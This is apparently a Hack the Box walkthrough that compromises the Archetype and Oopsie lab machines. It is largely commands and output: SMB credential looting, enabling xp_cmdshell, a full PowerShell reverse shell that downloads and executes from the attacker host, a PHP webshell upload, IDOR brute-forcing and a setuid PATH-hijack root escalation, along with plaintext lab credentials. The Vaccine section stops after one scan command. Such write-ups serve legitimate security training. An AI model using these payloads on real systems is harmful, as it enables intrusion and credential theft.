

[TOC]



# Hack the Box



## Archetype (Windows, SMB and MSSQL Server)

### Enumeration

``` 
# ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
# nmap -sC -sV -p$ports 10.10.10.27
tarting Nmap 7.91 ( https://nmap.org ) at 2021-03-05 05:39 EST
Nmap scan report for 10.10.10.27
Host is up (0.31s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-03-04T23:31:40
|_Not valid after:  2051-03-04T23:31:40
|_ssl-date: 2021-03-05T11:58:27+00:00; +1h17m19s from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h53m19s, deviation: 3h34m40s, median: 1h17m18s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-03-05T03:58:11-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-05T11:58:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.88 seconds
```

**Ports 445 and 1433 are open, which are associated with file sharing (SMB) and SQL Server.**

2. Use smbclient to list available shares

```
# smbclient -N -L \10.10.10.27

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

It seems there is a share called **backups**. Let's attempt to access it and see what's inside.

```
# smbclient -N \\\\10.10.10.27\\backups
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

		10328063 blocks of size 4096. 8247969 blocks available
smb: \> get prod.dtsConfig d.dtsConfig
getting file \prod.dtsConfig of size 609 as d.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> 
```

There is a dtsConfig file, which is a config file used with SQL Server Integration Services (SSIS) .

```
# cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
```

### Foothold

We see that it contains a SQL connection string, containing credentials for the local Windows user ARCHETYPE\sql_svc.

3. Connect to the SQL Server using Impacket's mssqlclient.py

https://github.com/SecureAuthCorp/impacket

```
(root💀kali)-[/home/kali/impacket/examples]
└─# python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```

We can use the IS_SRVROLEMEMBER function to reveal whether the current SQL user has sysadmin (highest level) privileges on the SQL Server. This is successful, and we do indeed have sysadmin privileges.

This will allow us to enable xp_cmdshell and gain RCE on the host. Let's attempt this, by inputting the commands below.

```
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1
SQL> reconfigure;
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL                  
```

The whoami command output reveals that the SQL Server is also running in the context of the user ARCHETYPE\sql_svc. However, this account doesn't seem to have administrative privileges on the host.

4. Let's attempt to get a proper shell, and proceed to further enumerate the system. We can save the PowerShell reverse shell below as shell.ps1.

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

5. Stand up a mini webserver in order to host the file. We can use Python.

```
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

6. Create a netcat listener

```
# nc -nvlp 443                               
listening on [any] 443 ...

```

7. We can now issue the command to download and execute the reverse shell through xp_cmdshell.

```
SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.21/shell.ps1\");"
```

### Privilege Escalation

8. Check the netcat listener

As this is a normal user account as well as a service account, it is worth checking for frequently access files or executed commands. We can use the command below to access the PowerShell history file.

```
# nc -nvlp 443                               
listening on [any] 443 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.27] 49842

# type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

This reveals that the backups drive has been mapped using the local administrator credentials.  **user:administrator MEGACORP_4dm1n!!**

9. We can use Impacket's psexec.py to gain a privileged shell.

```
(root💀kali)-[/home/kali/impacket/examples]
└─# python3 psexec.py administrator@10.10.10.27                                                                 1 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file oWFuDWsg.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service IQsh on 10.10.10.27.....
[*] Starting service IQsh.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```



## Oopsie (Linux, SSH and Apache)

### Enumeration

```
# nmap -sS -A -p- 10.10.10.28
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-07 23:08 EST
Nmap scan report for 10.10.10.28
Host is up (0.24s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=3/7%OT=22%CT=1%CU=34464%PV=Y%DS=2%DC=T%G=Y%TM=6045A494
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   235.95 ms 10.10.14.1
2   238.10 ms 10.10.10.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 346.94 seconds
                                                                                                     
```

Nmap reveals reveals that SSH and Apache are available on their default ports. Let's check out the website.

![image-20210308201344409](images\image-20210308201344409.png)

We can't see anything else of interest, so let's send the request to a web proxy such as Burp, so
we can examine the website in more detail. We point the browser to the Burp proxy at
127.0.0.1:8080 , refresh the page, and forward the request.

On the Target tab, we notice that Burp has passively spidered the website while processing the
request.

![image-20210308201357801](images\image-20210308201357801.png)

The URL /cdn-cgi/login seems interesting, let's examine this in the browser.

![image-20210308201426428](images\image-20210308201426428.png)

We confirm that this is a login page. Let's try to reuse the password **MEGACORP_4dm1n!!** from the previously compromised machine, with common usernames such as administrator or admin .

This is successful, and we gain access to the web portal, which contains additional functionality.

![image-20210308211341508](images\image-20210308211341508.png)

However, it seems the developer has implemented tiers of administration, and the Uploads page is further restricted to the super admin user.

Let's examine the portal further in Burp. We refresh on the Accounts page, which displays the user id for our current user, and intercept the request. We notice what seems to be a custom cookie implementation, comprising of the user value and role. We also notice the id parameter, which for our current admin user is 1.

![image-20210308211439977](images\image-20210308211439977.png)

It might be possible to brute force the id values, and display the user value for another user, such as the super admin account. We can do this using Burp's Intruder module. Click CTRL + i to sent the request to Intruder.

![image-20210308211522179](images\image-20210308211522179.png)

We press Clear to remove the pre-populated payload positions, select the Id value (1), and click Add. Next, click on the Payloads tab.

We can generate a sequential list of 1-100 using a simple bash loop.

```
for i in `seq 1 100`; do echo $i; done
```

Paste the output into the Payloads box.

![image-20210308211621604](images\image-20210308211621604.png)

Next, click on the Options tab, and ensure that Follow Redirectionsis set to "Always", and select the option to "Process cookies in redirections".

![image-20210308211647057](images\image-20210308211647057.png)

Click on the Target tab, and then click Start attack. We sort responses by Length, and view the results.

![image-20210308211721859](images\image-20210308211721859.png)

A few of a responses have a different length, and we proceed to examine them. The super admin account is visible, and corresponding user value is identified.

![image-20210308211801216](images\image-20210308211801216.png)

Let's try to access the Uploads page again, substituting our user value with the super admins.

![image-20210308211829973](images\image-20210308211829973.png)

### Foothold

This is successful, and we gain access to the upload page, which allows branding images to be uploaded.

![image-20210308211918596](images\image-20210308211918596.png)

It's possible that the developer forgot to implement user input validation, and so we should test if we can upload other files, such as a PHP webshell. On Parrot-OS, we can use the PHP reverse shell /usr/share/webshells/php/php-reverse-shell.php.

After changing the IP and port values, we upload the file, capture the request, substitute the user value as before, and click Forward.

Page text reports that the upload was successful, but we don't know where the reverse shell was uploaded to. Let's enumerate the web server for common directories using dirsearch.

```
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
python3 dirsearch.py -u http://10.10.10.28 -e php
```

![image-20210308212040365](\images\image-20210308212040365.png)

This identified an uploads directory, and we can set up our listener and trigger a reverse shell using curl.

```
curl http://10.10.10.28/uploads/test.php
```

We land a shell as www-data and proceed to upgrade it.

![image-20210308212135895](images\image-20210308212135895.png)



```
SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm
```



### Lateral Movement

The website records are probably retrieved from a database, so it's a good idea to check for database connection information. Indeed, db.php does contain credentials, and we can su robert to move laterally.

![image-20210308212306698](images\image-20210308212306698.png)

```
www-data@oopsie:/$ ls /var/www/html/cdn-cgi/login
ls /var/www/html/cdn-cgi/login
admin.php  db.php  index.php  script.js
www-data@oopsie:/$ cat /var/www/html/cdn-cgi/login/db.php
cat /var/www/html/cdn-cgi/login/db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```



### Privilege Escalation

The id command reveals that robert is a member of the bugracker group. We can enumerate the filesystem to see if this group has any special access.

![image-20210308212342372](images\image-20210308212342372.png)

```
www-data@oopsie:/$ find / -type f -group bugtracker 2>/dev/null
find / -type f -group bugtracker 2>/dev/null
/usr/bin/bugtracker
www-data@oopsie:/$ ls -al /usr/bin/bugtracker
ls -al /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```



There is a bugtracker binary, and the setuid but is set. Let's run it and see what it does.

![image-20210308212422530](images\image-20210308212422530.png)

```
robert@oopsie:~$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.

```



It seems to output a report based on the ID value provided. Let's use strings to see how it does this.

![image-20210308212451556](images\image-20210308212451556.png)

```
robert@oopsie:~$ strings /usr/bin/bugtracker
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
strcpy
__isoc99_scanf
__stack_chk_fail
putchar
printf
strlen
malloc
strcat
system
geteuid
__cxa_finalize
__libc_start_main
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
------------------
: EV Bug Tracker :
------------------
Provide Bug ID: 
---------------
cat /root/reports/
;*3$"
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7697
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
test.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
putchar@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
strcpy@@GLIBC_2.2.5
_edata
strlen@@GLIBC_2.2.5
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
concat
geteuid@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
malloc@@GLIBC_2.2.5
__bss_start
main
__isoc99_scanf@@GLIBC_2.7
strcat@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```



We see that it calls the cat binary using this relative path instead of the absolute path. By creating a malicious cat, and modifying the path to include the current working directory, we should be able to abuse this misconfiguration, and escalate our privileges to root.

Let's add the current working directory to PATH, create the malicious binary and make it executable.

![image-20210308212527373](images\image-20210308212527373.png)

```
robert@oopsie:~$ export PATH=/tmp:$PATH
robert@oopsie:~$ cd /tmp
robert@oopsie:/tmp$ echo '/bin/bash' > cat
robert@oopsie:/tmp$ chmod +x cat 
robert@oopsie:/tmp$ /usr/bin/bugtracker 

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
---------------

root@oopsie:/tmp# id
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
root@oopsie:/tmp# 
```



### Post Exploitation

Inside root's folder, we see a .config folder, which contains a FileZilla config file with the credentials ftpuser / mc@F1l3ZilL4 visible in plain text.

```
oot@oopsie:/root# cd .config/
root@oopsie:/root/.config# ls
filezilla
root@oopsie:/root/.config# cat filezilla/
root@oopsie:/root/.config# cd filezilla/
root@oopsie:/root/.config/filezilla# ls
filezilla.xml
root@oopsie:/root/.config/filezilla# vi filezilla.xml
```

```
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<FileZilla3>
    <RecentServers>
        <Server>
            <Host>10.10.10.46</Host>
            <Port>21</Port>
            <Protocol>0</Protocol>
            <Type>0</Type>
            <User>ftpuser</User>
            <Pass>mc@F1l3ZilL4</Pass>
            <Logontype>1</Logontype>
            <TimezoneOffset>0</TimezoneOffset>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <MaximumMultipleConnections>0</MaximumMultipleConnections>
            <EncodingType>Auto</EncodingType>
            <BypassProxy>0</BypassProxy>
        </Server>
    </RecentServers>
</FileZilla3>

```

### FLAG

```
root@oopsie:/tmp# cd /root/
root@oopsie:/root# ls
reports  root.txt
oot@oopsie:/root# cat root.txt
af13b0bee69f8a877c3faf667f7beacf
```



## Vaccine

### Enumeration

```
# nmap -sC -sV 10.10.10.46
```



